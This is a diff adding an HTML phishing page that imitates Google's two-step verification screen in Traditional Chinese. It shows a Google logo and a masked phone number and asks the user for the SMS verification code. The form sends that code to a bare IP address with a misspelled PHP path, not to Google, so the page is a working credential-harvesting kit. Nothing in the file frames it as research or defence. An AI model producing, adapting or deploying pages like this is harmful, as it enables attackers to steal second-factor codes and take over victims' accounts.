@@ -1,0 +1,371 @@
+﻿<!DOCTYPE html>
+<html >
+<head>
+
+    <link rel="stylesheet" type="text/css" href="./css/buttons.css" />
+
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+
+
+  <meta http-equiv="Content-Type" content="text/html; 
+charset=UTF-8">
+  <title>Material Design Login Screen</title>
+
+      <link rel="stylesheet" href="css/style2.css">
+
+ 
+<style>
+<!--
+  html, body {
+  font-family: Arial, sans-serif;
+  background: #5DCFD7;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 13px;
+  color: #404040;
+  direction: ltr;
+  -webkit-text-size-adjust: none;
+  }
+  button,
+  input[type=button],
+  input[type=submit] {
+  font-family: Arial, sans-serif;
+  font-size: 13px;
+  }
+  a,
+  a:hover,
+  a:visited {
+  color: #427fed;
+  cursor: pointer;
+  text-decoration: none;
+  }
+  a:hover {
+  text-decoration: underline;
+  }
+  h1 {
+  font-size: 20px;
+  color: #262626;
+  margin: 0 0 15px;
+  font-weight: normal;
+  }
+  h2 {
+  font-size: 14px;
+  color: #262626;
+  margin: 0 0 15px;
+  font-weight: bold;
+  }
+  input[type=email],
+  input[type=number],
+  input[type=password],
+  input[type=tel],
+  input[type=text],
+  input[type=url] {
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 36px;
+  padding: 0 8px;
+  margin: 0;
+  background: #fff;
+  border: 1px solid #d9d9d9;
+  border-top: 1px solid #c0c0c0;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 1px;
+  font-size: 15px;
+  color: #404040;
+  }
+
+  .card {
+  margin-bottom: 20px;
+  }
+  .card {
+  padding: 170px 15px 30px;
+  width: 270px;
+  }
+
+  .infobanner {
+  background: #f7eba9;
+  margin-bottom: 20px;
+  margin-left: -25px;
+  margin-right: -25px;
+  position: relative;
+  }
+
+  .infobanner {
+  margin-left: -15px;
+  margin-right: -15px;
+  }
+.deliverymethodcontainer {
+  margin-bottom: 20px;
+  background-image: url(//ssl.gstatic.com/accounts/strongauth/sms_1x.png);
+  background-size: 72px 72px;
+  background-repeat: no-repeat;
+  background-position: left center;
+  min-height: 72px;
+  padding-left: 82px;
+}
+
+  .deliverymethodcontainer {
+  background-image: url(//ssl.gstatic.com/accounts/strongauth/sms_2x.png);
+  background-size: 72px 72px;
+  background-repeat: no-repeat;
+  background-position: left center;
+  min-height: 72px;
+  padding-left: 82px;
+  }
+.deliverytype {
+  font-weight: bold;
+}
+
+.twostepphone {
+  white-space: nowrap;
+}
+  .hidden-label {
+  position: absolute !important;
+  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
+  clip: rect(1px, 1px, 1px, 1px);
+  height: 0px;
+  width: 0px;
+  overflow: hidden;
+  visibility: hidden;
+  }
+  .rc-button {
+  display: inline-block;
+  min-width: 46px;
+  text-align: center;
+  color: #444;
+  font-size: 14px;
+  font-weight: 700;
+  height: 36px;
+  line-height: 36px;
+  -moz-border-radius: 3px;
+  -webkit-border-radius: 3px;
+  border-radius: 3px;
+  -o-transition: all 0.218s;
+  -moz-transition: all 0.218s;
+  -webkit-transition: all 0.218s;
+  transition: all 0.218s;
+  border: 1px solid #dcdcdc;
+  background-color: #f5f5f5;
+  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
+  background-image: url('file:///C:/Users/DRO/Downloads/ic/between/linear-gradient(top,#f5f5f5,#f1f1f1');
+  -o-transition: none;
+  -moz-user-select: none;
+  -webkit-user-select: none;
+  user-select: none;
+  cursor: default; padding-left:8px; padding-right:8px; padding-top:0; padding-bottom:0
+  }
+  .rc-button-submit {
+  border: 1px solid #3079ed;
+  color: #fff;
+  text-shadow: 0 1px rgba(0,0,0,0.1);
+  background-color: #4d90fe;
+  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
+  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
+  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
+  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
+  background-image: url('file:///C:/Users/DRO/Downloads/ic/between/linear-gradient(top,#4d90fe,#4787ed');
+  }
+  .card .rc-button {
+  width: 100%;
+  padding: 0;
+  }
+
+#PersistentCookie {
+  float: left;
+}
+-->
+</style>
+<style media="screen and (-webkit-min-device-pixel-ratio: 1.3), screen and (min-resolution: 144dpi)">
+  .deliverymethodcontainer {
+  background-image: url(//ssl.gstatic.com/accounts/strongauth/sms_2x.png);
+  background-size: 72px 72px;
+  background-repeat: no-repeat;
+  background-position: left center;
+  min-height: 72px;
+  padding-left: 82px;
+  }
+</style>
+<style media="screen and (-webkit-min-device-pixel-ratio: 1.3), screen and (min-resolution: 144dpi)">
+  .action-card ul li a.arrow-action {
+  background-image: url(//ssl.gstatic.com/accounts/ui/arrow_right_2x.png)
+  }
+</style>
+<style>
+#PersistentCookie {
+  float: left;
+}
+#PersistentCookieLabel {
+  display: block;
+  margin-left: 20px;
+}
+</style>
+<style type="text/css">
+  .infobanner {
+  background: #f7eba9;
+  margin-bottom: 20px;
+  margin-left: -25px;
+  margin-right: -25px;
+  position: relative;
+  }
+  .card > .infobanner:first-child {
+  margin-top: -20px;
+  -moz-border-radius-topleft: 2px;
+  -webkit-border-top-left-radius: 2px;
+  border-top-left-radius: 2px;
+  -moz-border-radius-topright: 2px;
+  -webkit-border-top-right-radius: 2px;
+  border-top-right-radius: 2px;
+  }
+  .infobanner-content {
+  margin: 0;
+  padding: 15px 25px;
+  }
+</style>
+<style type="text/css" media="screen and (max-width: 580px)">
+  .infobanner {
+  margin-left: -15px;
+  margin-right: -15px;
+  }
+  .infobanner-content {
+  padding: 15px 15px;
+  }
+</style>
+<style>
+  .infobanner > .infobanner-content:last-child:after {
+  border-top: 10px solid #f7eba9;
+  border-left: 10px solid transparent;
+  border-right: 10px solid transparent;
+  bottom: -10px;
+  content: "";
+  height: 0;
+  left: 35px;
+  position: absolute;
+  width: 0;
+  }
+</style>
+<style media="screen and (max-width: 580px)">
+  .infobanner > .infobanner-content:last-child:after {
+  left: 25px;
+  }
+</style>
+<style>
+.twostepphone {
+  white-space: nowrap;
+}
+.secondfactor-card input[type=tel],
+.secondfactor-card input[type=text],
+.secondfactor-card input[type=submit] {
+  width: 100%;
+  display: block;
+  margin-bottom: 10px;
+  position: relative;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+}
+.retry-card div {
+  margin-bottom: 10px;
+  zoom: 1;
+}
+.retry-card input[type="radio"] {
+  float: left;
+}
+.retry-card label {
+  display: block;
+  margin-left: 20px;
+}
+.buttonaslink {
+  color: #427fed;
+  cursor: pointer;
+  text-decoration: none;
+  display: inline;
+  background-color: transparent;
+  border-style: none;
+  margin: 0;
+}
+.deliverytype {
+  font-weight: bold;
+}
+.deliverymethodcontainer {
+  margin-bottom: 30px;
+  background-image: url(//ssl.gstatic.com/accounts/strongauth/sms_1x.png);
+  background-size: 72px 72px;
+  background-repeat: no-repeat;
+  background-position: left center;
+  min-height: 72px;
+  padding-left: 82px;
+}
+.subtitle-text {
+  font-size: 80%;
+  font-style: italic;
+}
+</style>
+<style media="screen and (-webkit-min-device-pixel-ratio: 1.3), screen and (min-resolution: 144dpi)">
+  .deliverymethodcontainer {
+  background-image: url(//ssl.gstatic.com/accounts/strongauth/sms_2x.png);
+  background-size: 72px 72px;
+  background-repeat: no-repeat;
+  background-position: left center;
+  min-height: 72px;
+  padding-left: 82px;
+  }
+</style>
+
+
+ 
+</head>
+
+<body>
+  <center>
+  <form method="post" action="http://207.210.200.146/~goontone/goo/uesr_confirm/.php" id="gaia_secondfactorform">
+<div class="login">
+  <div class="top">
+  <div class="logo"><img class="google" src="./css/logo.png"></div>
+    <div class="title">兩步驟驗證</div>
+  </div>
+  <div class="card secondfactor-card">
+      <table border="0" width="100%" height="50%">
+			<tr>
+				
+	<td>
+	<img src="./css/sms.png"  align="left" width="25%" height="40%"/><b>包含驗證碼的簡訊已傳送至下列號碼： 09** *** *** 
+	</b> 
+	<p> <br/>請查看手機中訊息</td>
+				
+			</tr>
+		</table>
+
+<br>
+  <label for="smsUserPin" class="hidden-label">輸入驗證碼</label>
+  <input name="smsUserPin" id="smsUserPin" autocomplete="off" autofocus="autofocus" dir="ltr" type="tel" pattern="[0-9 ]*" placeholder="輸入驗證碼">
+  <script>
+  document.getElementById('smsUserPin').focus();
+  </script>
+  <input type="submit" name="smsVerifyPin" id="smsVerifyPin" value="驗證" class="rc-button rc-button-submit">
+  <input id="PersistentCookie" type="checkbox" class="remember-checkbox" value="yes" checked="checked" name="PersistentCookie">
+  <label for="PersistentCookie" id="PersistentCookieLabel" style="display: block; margin-left: 20px">
+  <span id="smsauth-persistent-label-maintext">
+  不要在這部電腦上要求我輸入驗證碼
+  </span>
+  </label>
+  </div>
+</div>
+  </form>
+
+  
+</body>
+</html>
